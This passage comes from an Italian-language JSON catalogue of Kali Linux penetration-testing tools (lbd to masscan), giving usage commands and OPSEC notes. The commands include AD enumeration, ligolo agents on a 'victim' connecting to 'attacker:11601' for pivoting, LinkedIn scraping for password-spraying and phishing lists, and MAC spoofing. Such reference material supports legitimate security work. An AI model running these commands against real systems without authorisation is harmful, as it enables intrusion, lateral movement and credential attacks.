    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "lbd",
    "name": "lbd",
    "version": "0.4",
    "icon": "../app/icons/lbd-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/lbd/",
    "desc": "Rileva load balancer e WAF analizzando differenze nelle risposte HTTP multiple.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LBD (Load Balancing Detector) identifica se un sito web utilizza load balancer o WAF. Analizza differenze nelle risposte HTTP multiple: variazioni di header, timestamp, server ID, cookie. Utile per capire l'infrastruttura target prima di attacchi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DNS Check:</strong> Multiple A record detection.</p><p><strong>HTTP Analysis:</strong> Differenze nelle risposte.</p><p><strong>Server ID:</strong> Identifica backend diversi.</p><p><strong>Timing Analysis:</strong> Variazioni temporali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Detection base\nlbd target.com\n\n# Output esempio:\n# DNS-based load balancing: YES\n# HTTP-based load balancing: YES\n# Server 1: Apache/2.4\n# Server 2: nginx/1.18</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Recon</strong>, mappa infrastruttura web. Nel <strong>Pentesting</strong>, identifica backend da attaccare. <strong>Bypass Planning</strong> per WAF detection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Basso rumore:</strong> Solo richieste HTTP standard. Pattern non sospetto. Simile a traffico utente normale. Nessun payload malevolo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "WAF"
    ],
    "notes": null
  },
  {
    "id": "ldeep",
    "name": "ldeep",
    "version": "1.0.87",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ldeep/",
    "desc": "Tool LDAP per enumerazione AD: utenti, gruppi, GPO, trust, delegation e ACL.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LDeep è un tool per enumerazione LDAP specializzato in Active Directory. Estrae utenti, gruppi, computer, GPO, trust relationships, delegation settings, e ACL. Può operare sia con credenziali che in sessione anonima dove permesso.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enum:</strong> Lista utenti con attributi.</p><p><strong>Group Membership:</strong> Membri di gruppi privilegiati.</p><p><strong>Delegation:</strong> Trova misconfiguration delegation.</p><p><strong>ACL Analysis:</strong> Permessi su oggetti AD.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera utenti\nldeep ldap -u user -p password -d domain.com -s dc.domain.com users\n\n# Gruppi privilegiati\nldeep ldap -u user -p pass -d domain.com -s dc groups\n\n# Computer con delegation\nldeep ldap -u user -p pass -d domain.com delegation\n\n# Cached credentials (da file)\nldeep cache -d domain -f dump.json users</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Enumeration</strong>, raccolta info iniziale. Nel <strong>Privilege Escalation</strong>, trova misconfiguration. <strong>Security Audit</strong> di permessi AD.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Standard LDAP:</strong> Query LDAP normali. Difficile distinguere da attività legittima. Alto volume può essere notato. Event log LDAP se abilitato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "legion",
    "name": "legion",
    "version": "0.4.3",
    "icon": "../app/icons/legion-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/legion/",
    "desc": "Framework GUI per penetration testing con automazione scanning e integrazione tool.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Legion è un framework GUI open-source per penetration testing. Automatizza la fase di reconnaissance integrando tool come Nmap, Nikto, dirbuster, e script NSE. Organizza risultati in database, genera report, e orchestra scan multipli su target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-scanning:</strong> Lancia tool appropriati per servizi.</p><p><strong>Integration:</strong> Nmap, Nikto, Hydra, e altri.</p><p><strong>Database:</strong> Archivia tutti i risultati.</p><p><strong>Scheduling:</strong> Pianifica scan automatici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Legion\nlegion\n\n# Dalla GUI:\n# 1. New Scan -> inserisci target\n# 2. Legion lancia Nmap\n# 3. Per ogni servizio trovato, suggerisce tool\n# 4. Risultati organizzati per host/servizio\n# 5. Export report</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pentesting</strong>, automazione fase recon. Nel <strong>Team Work</strong>, database condiviso di risultati. <strong>Reporting</strong> con dati organizzati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> Lancia molti tool in parallelo. Pattern di scanning evidente. Traffico significativo generato. Per ambienti autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "ligolo-mp",
    "name": "ligolo-mp",
    "version": "2.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ligolo-mp/",
    "desc": "Ligolo multiplatform con agent per Windows, Linux e macOS per pivoting avanzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ligolo-mp è la versione multiplatform di Ligolo per tunneling e pivoting. Include agent compilati per Windows, Linux e macOS. Crea tunnel TCP/UDP senza necessità di SOCKS proxy, permettendo accesso diretto a reti interne attraverso host compromessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiplatform:</strong> Agent per Win/Linux/macOS.</p><p><strong>TUN Interface:</strong> Routing diretto senza SOCKS.</p><p><strong>Encrypted:</strong> Tunnel TLS per comunicazioni.</p><p><strong>Port Forward:</strong> Redirect porte specifiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server (attacker)\nligolo-proxy -selfcert -laddr 0.0.0.0:11601\n\n# Agent (victim)\n./agent -connect attacker:11601 -ignore-cert\n\n# Nel proxy, crea tunnel\n[Agent] >> session\n[Agent] >> ifconfig\n[Agent] >> start</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pivoting</strong>, accesso a reti interne. Nel <strong>Red Team</strong>, movimento laterale attraverso segmenti. <strong>Pentesting</strong> di reti segregate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Moderato:</strong> Connessione outbound TLS. Agent binario su victim. Traffic analysis può identificare tunnel. Processo agent visibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ligolo-ng-common-binaries",
    "name": "ligolo-ng-common-binaries",
    "version": "0.8.2",
    "icon": "../app/icons/ligolo-ng-common-binaries-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ligolo-ng-common-binaries/",
    "desc": "Agent ligolo-ng precompilati per Windows, Linux e macOS pronti per il deploy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ligolo-ng Common Binaries contiene agent ligolo-ng precompilati per varie piattaforme. Include binari per Windows (x86/x64), Linux (x86/x64/ARM), e macOS pronti per il deploy immediato su sistemi target senza necessità di compilazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Precompiled:</strong> Binari pronti all'uso.</p><p><strong>Multi-arch:</strong> x86, x64, ARM.</p><p><strong>Multi-OS:</strong> Windows, Linux, macOS.</p><p><strong>Ready Deploy:</strong> Transfer e esegui.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Location in Kali\nls /usr/share/ligolo-ng/\n\n# Copia agent appropriato\ncp /usr/share/ligolo-ng/agent-windows-amd64.exe .\n\n# Transfer su target e esegui\n./agent -connect attacker:11601 -ignore-cert</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Deploy</strong>, agent pronti senza compilazione. Nel <strong>Pivoting</strong>, deploy rapido durante engagement. <strong>Multi-target</strong> con architetture diverse.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signature note:</strong> Binari precompilati possono essere flaggati. Considera compilazione custom. Hash noti a AV vendor.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ligolo-ng-kali",
    "name": "ligolo-ng",
    "version": "0.8.2",
    "icon": "../app/icons/ligolo-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ligolo-ng/",
    "desc": "Tunnel TCP/UDP con interfaccia TUN per pivoting completo senza proxy SOCKS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ligolo-ng è un tool di tunneling avanzato che crea interfacce TUN per pivoting. A differenza di SOCKS proxy, permette routing diretto del traffico verso reti interne. Supporta TCP/UDP, è veloce, e permette di usare qualsiasi tool senza configurazione proxy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TUN Interface:</strong> Routing layer 3 completo.</p><p><strong>TCP/UDP:</strong> Supporto entrambi i protocolli.</p><p><strong>No SOCKS:</strong> Tool funzionano nativamente.</p><p><strong>Double Pivot:</strong> Tunnel attraverso più hop.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup TUN interface (una volta)\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n\n# Avvia proxy\nligolo-proxy -selfcert\n\n# Su target, avvia agent\n./agent -connect attacker:11601 -ignore-cert\n\n# Nel proxy\nsession\nifconfig\nstart\n\n# Aggiungi route su attacker\nsudo ip route add 10.10.10.0/24 dev ligolo</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Pivoting</strong>, accesso completo a subnet interne. Nel <strong>Red Team</strong>, lateral movement avanzato. <strong>Pentesting</strong> senza limitazioni SOCKS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Moderato:</strong> Connessione TLS outbound. Agent process su victim. Traffic volume può essere alto. DPI può identificare pattern.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "linkedin2username",
    "name": "linkedin2username",
    "version": "0.29",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/linkedin2username/",
    "desc": "Genera liste di username da profili LinkedIn per password spraying e phishing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LinkedIn2Username genera liste di possibili username aziendali da profili LinkedIn. Partendo dal nome di un'azienda, enumera dipendenti e genera username in vari formati (john.doe, jdoe, doej). Essenziale per password spraying e campagne di phishing mirate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Employee Scraping:</strong> Enumera dipendenti da LinkedIn.</p><p><strong>Username Formats:</strong> Genera varianti multiple.</p><p><strong>Customizable:</strong> Formati personalizzabili.</p><p><strong>Export:</strong> Liste pronte per attacchi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera e genera username\nlinkedin2username -u your@email.com -c \"Target Company\"\n\n# Con formato specifico\nlinkedin2username -u email -c \"Company\" -f \"first.last\"\n\n# Formati multipli\nlinkedin2username -u email -c \"Company\" -f \"flast,first.last,firstl\"\n\n# Output file\nlinkedin2username -u email -c \"Company\" -o users.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Password Spraying</strong>, lista username validi. Nel <strong>Phishing</strong>, email personalizzate. <strong>OSINT</strong> per mappare struttura aziendale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>LinkedIn Detection:</strong> Scraping può causare ban. Rate limiting necessario. Account LinkedIn sacrificabile. Non contatta il target.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "linux-exploit-suggester",
    "name": "linux-exploit-suggester",
    "version": "1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/linux-exploit-suggester/",
    "desc": "Suggerisce exploit kernel Linux basandosi su versione e configurazione del sistema.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Linux Exploit Suggester analizza un sistema Linux e suggerisce exploit kernel applicabili per privilege escalation. Verifica versione kernel, configurazione, e confronta con database di vulnerabilità note. Indica probabilità di successo e fornisce link a exploit.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Kernel Analysis:</strong> Identifica versione e config.</p><p><strong>CVE Database:</strong> Confronta con vulnerabilità note.</p><p><strong>Probability:</strong> Stima probabilità di successo.</p><p><strong>Exploit Links:</strong> Riferimenti a PoC e exploit.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Esegui sul target\n./linux-exploit-suggester.sh\n\n# Con output dettagliato\n./linux-exploit-suggester.sh -k 4.15.0-20-generic\n\n# Filtra per probabilità\n./linux-exploit-suggester.sh | grep -i \"high\"\n\n# Output CSV\n./linux-exploit-suggester.sh --csv > results.csv</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privilege Escalation</strong>, trova exploit kernel applicabili. Nel <strong>CTF</strong>, quick check per privesc. <strong>Security Audit</strong> di patching kernel.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passivo:</strong> Solo legge info sistema. Nessun exploit eseguito. Script bash su disco o in memoria. Output può essere grande.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "llm-tools-nmap",
    "name": "llm-tools-nmap",
    "version": "0.0~git20250612.36818ca",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/llm-tools-nmap/",
    "desc": "Integrazione Nmap per LLM che permette a AI di eseguire e interpretare scan di rete.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LLM-Tools-Nmap è un'integrazione che permette a Large Language Models di eseguire e interpretare scan Nmap. Fornisce un'interfaccia per AI assistant per condurre reconnaissance di rete, analizzare risultati, e suggerire azioni basate sui servizi trovati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LLM Integration:</strong> API per modelli AI.</p><p><strong>Scan Execution:</strong> Lancia Nmap via LLM.</p><p><strong>Result Parsing:</strong> Struttura output per AI.</p><p><strong>Recommendations:</strong> Suggerimenti automatici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configurazione come tool per LLM\n# L'AI può richiedere scan come:\n\"Scan target 192.168.1.1 for open ports\"\n\"Run service detection on 10.10.10.0/24\"\n\n# Il tool traduce in comandi Nmap\n# e restituisce risultati strutturati</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AI-Assisted Pentesting</strong>, recon guidato da LLM. Nel <strong>Automation</strong>, scan orchestrati da AI. <strong>Learning</strong> con spiegazioni AI dei risultati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Come Nmap:</strong> Stesse considerazioni degli scan diretti. Traffico di scanning rilevabile. AI può suggerire scan aggressivi - verificare prima.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "mac-robber",
    "name": "mac-robber",
    "version": "1.02",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mac-robber/",
    "desc": "Estrae timestamp MAC (Modified, Accessed, Changed) da filesystem per timeline forense.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Mac-robber estrae timestamp MAC (Modified, Accessed, Changed/Created) da file su filesystem. Output in formato compatibile con mactime per creare timeline forensi. Utile per ricostruire sequenza di eventi durante incident response e analisi forense.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MAC Times:</strong> Estrae tutti i timestamp.</p><p><strong>Recursive:</strong> Analizza intere directory.</p><p><strong>Body File:</strong> Output per mactime tool.</p><p><strong>Fast:</strong> Scansione veloce filesystem.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Estrai MAC times\nmac-robber /path/to/analyze > body.txt\n\n# Crea timeline con mactime\nmactime -b body.txt > timeline.txt\n\n# Timeline in range temporale\nmactime -b body.txt 2024-01-01..2024-01-31\n\n# Con mount di immagine disco\nmount -o ro,loop image.dd /mnt/evidence\nmac-robber /mnt/evidence > body.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Forensics</strong>, timeline di attività su filesystem. Nel <strong>Incident Response</strong>, ricostruisce sequenza eventi. <strong>Malware Analysis</strong> per capire quando file sono stati creati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-only:</strong> Non modifica filesystem. Montare sempre in read-only per preservare evidence. Output può essere grande su filesystem ampi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "macchanger",
    "name": "macchanger",
    "version": "1.7.0",
    "icon": "../app/icons/macchanger-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/macchanger/",
    "desc": "Modifica MAC address di interfacce di rete per anonimato e bypass filtri.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Macchanger modifica il MAC address delle interfacce di rete. Permette di cambiare l'indirizzo hardware per anonimato, bypass di filtri MAC, e impersonazione di dispositivi. Include database di vendor per generare MAC credibili di specifici produttori.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Random MAC:</strong> Genera MAC completamente casuale.</p><p><strong>Vendor Specific:</strong> MAC di vendor specifico.</p><p><strong>Custom:</strong> Imposta MAC specifico.</p><p><strong>Restore:</strong> Ripristina MAC originale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Down dell'interfaccia prima\nsudo ip link set eth0 down\n\n# MAC completamente random\nsudo macchanger -r eth0\n\n# MAC di vendor specifico (es. Apple)\nsudo macchanger -a eth0\n\n# MAC specifico\nsudo macchanger -m 00:11:22:33:44:55 eth0\n\n# Ripristina originale\nsudo macchanger -p eth0\n\n# Up dell'interfaccia\nsudo ip link set eth0 up</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Anonimato</strong>, evita tracking via MAC. Nel <strong>Bypass</strong>, supera filtri MAC-based. <strong>Testing</strong> di NAC e 802.1X. <strong>Impersonation</strong> di device autorizzati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Layer 2:</strong> Solo efficace su rete locale. Switch possono loggare cambi MAC. 802.1X con certificati non bypassabile. DHCP lease può rivelare cambio.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "maltego-teeth",
    "name": "maltego-teeth",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/maltego-teeth/",
    "desc": "Transform Maltego per integrazione con tool Kali: Nmap, Shodan, theHarvester.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Maltego Teeth fornisce transform per integrare Maltego con tool Kali Linux. Permette di eseguire Nmap, theHarvester, e altri tool direttamente da Maltego, visualizzando i risultati come entità nel graph. Estende le capacità OSINT con tool di scanning attivo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Nmap Integration:</strong> Scan direttamente da Maltego.</p><p><strong>theHarvester:</strong> Email e subdomain enumeration.</p><p><strong>Visual Results:</strong> Output come entità nel graph.</p><p><strong>Workflow:</strong> Automatizza pipeline di recon.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># In Maltego:\n# 1. Installa Maltego Teeth transform\n# 2. Configura path ai tool Kali\n# 3. Right-click su entità -> Run Transform\n# 4. Seleziona transform Kali (Nmap, etc.)\n# 5. Risultati aggiunti al graph</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Recon Workflow</strong>, integra scanning in OSINT. Nel <strong>Visual Analysis</strong>, graph di risultati Nmap. <strong>Automation</strong> di pipeline investigative.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Come tool sottostanti:</strong> Stesse considerazioni dei tool eseguiti. Nmap scan è attivo e rilevabile. Configura correttamente i parametri.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "maltego",
    "name": "maltego",
    "version": "4.10.1",
    "icon": "../app/icons/maltego-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/maltego/",
    "desc": "Piattaforma OSINT con graph visualization per mappare relazioni tra entità e target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Maltego è la piattaforma leader per OSINT e link analysis. Visualizza relazioni tra entità (persone, aziende, domini, IP, social) in graph interattivi. I Transform automatizzano la raccolta dati da centinaia di fonti. Essenziale per investigazioni e threat intelligence.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Graph Visualization:</strong> Mappa relazioni visivamente.</p><p><strong>Transforms:</strong> 400+ data source integrati.</p><p><strong>Entities:</strong> Persone, domini, IP, email, social.</p><p><strong>Collaboration:</strong> Team workspace condivisi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Maltego\nmaltego\n\n# Workflow tipico:\n# 1. New Graph\n# 2. Aggiungi entità iniziale (domain, email, persona)\n# 3. Right-click -> Run Transform\n# 4. Seleziona data source (WHOIS, DNS, Shodan)\n# 5. Analizza relazioni nel graph\n# 6. Espandi con ulteriori transform</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, investigazioni su persone e aziende. Nel <strong>Threat Intel</strong>, mappa infrastrutture malevole. <strong>Fraud Investigation</strong> per seguire collegamenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dipende dai transform:</strong> Alcuni sono passivi (WHOIS cache), altri attivi. API key possono loggare query. Versione CE ha limitazioni.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "maryam",
    "name": "maryam",
    "version": "2.5.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/maryam/",
    "desc": "Framework OSINT modulare con 50+ moduli per recon: DNS, email, social, metadata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Maryam è un framework OSINT modulare open-source. Include oltre 50 moduli per DNS enumeration, email harvesting, social media recon, metadata extraction, e altro. Interfaccia CLI interattiva simile a Metasploit per gestire moduli e target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Modular:</strong> 50+ moduli indipendenti.</p><p><strong>Multi-source:</strong> DNS, email, social, docs.</p><p><strong>Interactive:</strong> Shell tipo Metasploit.</p><p><strong>Reporting:</strong> Export in vari formati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Maryam\nmaryam\n\n# Lista moduli\nshow modules\n\n# Usa modulo DNS\nuse osint/dns_search\nset DOMAIN target.com\nrun\n\n# Usa modulo email\nuse osint/email_search\nset DOMAIN target.com\nrun</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, reconnaissance iniziale su target. Nel <strong>Pentesting</strong>, enumeration di subdomain e email. <strong>Investigation</strong> con approccio modulare.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Variabile:</strong> Dipende dal modulo usato. Alcuni passivi (search engine), altri attivi (DNS query). Rate limiting su alcune fonti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "masscan",
    "name": "masscan",
    "version": "1.3.2",
    "icon": "../app/icons/masscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/masscan/",
    "desc": "Port scanner più veloce al mondo, scansiona l'intero internet in pochi minuti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Masscan è il port scanner più veloce esistente, capace di scansionare l'intero internet in meno di 6 minuti. Usa stack TCP/IP custom e trasmissione asincrona per raggiungere 10+ milioni di pacchetti/secondo. Output compatibile con Nmap per integrazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Velocità:</strong> 10M+ pacchetti/secondo.</p><p><strong>Scalabilità:</strong> Scansiona range enormi.</p><p><strong>Custom Stack:</strong> Bypass del kernel per performance.</p><p><strong>Nmap Compatible:</strong> Output XML/grepable.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan veloce di subnet\nmasscan 192.168.0.0/16 -p80,443 --rate 10000\n\n# Range di porte\nmasscan 10.0.0.0/8 -p1-65535 --rate 100000\n\n# Output Nmap compatible\nmasscan 192.168.1.0/24 -p1-1000 -oX scan.xml\n\n# Esclusione range\nmasscan 0.0.0.0/0 -p443 --exclude 10.0.0.0/8</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Large Scale Recon</strong>, scansione di internet o grandi range. Nel <strong>Asset Discovery</strong>, trova tutti i servizi esposti. <strong>Bug Bounty</strong> per scope ampi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Estremamente Rumoroso:</strong> Milioni di pacchetti visibili. Facilmente bannato. Può saturare connessione. Usare rate limiting e --exclude per IP sensibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "massdns",
    "name": "massdns",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/massdns/",
    "desc": "DNS resolver ad alte prestazioni per risolvere milioni di domini in parallelo.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MassDNS è un resolver DNS ad altissime prestazioni. Risolve milioni di domini usando stub resolver multipli in parallelo. Perfetto per validare output di subdomain enumeration o risolvere grandi liste di potenziali subdomain generati con wordlist.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Performance:</strong> 350k+ risoluzioni/secondo.</p><p><strong>Multi-resolver:</strong> Usa server DNS multipli.</p><p><strong>Reliable:</strong> Retry automatici per failure.</p><p><strong>Flexible Output:</strong> JSON, simple, etc.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Risolvi lista di subdomain\nmassdns -r resolvers.txt -t A domains.txt -o S > results.txt\n\n# Con output JSON\nmassdns -r resolvers.txt -t A domains.txt -o J > results.json\n\n# Pipeline con sublist3r\nsublist3r -d target.com -o subs.txt\nmassdns -r resolvers.txt -t A subs.txt -o S\n\n# Resolver pubblici\nmassdns -r /usr/share/massdns/lists/resolvers.txt domains.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Subdomain Validation</strong>, verifica quali subdomain esistono. Nel <strong>Bug Bounty</strong>, risoluzione rapida di grandi liste. <strong>Asset Discovery</strong> su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alto volume DNS:</strong> Molte query a resolver pubblici. Pattern riconoscibile. Possibile rate limiting. Usa resolver diversificati e attendibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "mcp-kali-server",
    "name": "mcp-kali-server",
    "version": "0.0~git20250407.df99f04",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mcp-kali-server/",
    "desc": "Server MCP per integrare tool Kali con LLM AI per automazione pentest assistita.",
